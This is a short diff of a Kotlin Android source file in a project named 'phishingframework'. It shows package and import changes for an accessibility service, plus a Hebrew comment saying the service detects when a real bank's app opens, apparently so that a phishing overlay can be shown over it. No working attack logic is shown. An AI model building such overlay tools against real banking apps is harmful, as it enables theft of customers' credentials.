@@ -1,4 +1,4 @@
-package com.example.phishingframework
+package com.example.phishingframework.services
 
 import android.accessibilityservice.AccessibilityService
 import android.content.BroadcastReceiver
@@ -11,6 +11,8 @@ import android.os.Handler
 import android.os.Looper
 import android.view.accessibility.AccessibilityNodeInfo
 import androidx.core.content.ContextCompat
+import com.example.phishingframework.activities.CaughtActivity
+import com.example.phishingframework.activities.PhishingOverlayActivity
 
 //מטרת המחלקה:
 //לזהות את פתיחת אפליקציית המטרה = הבנק (com.ideomobile.mercantile)
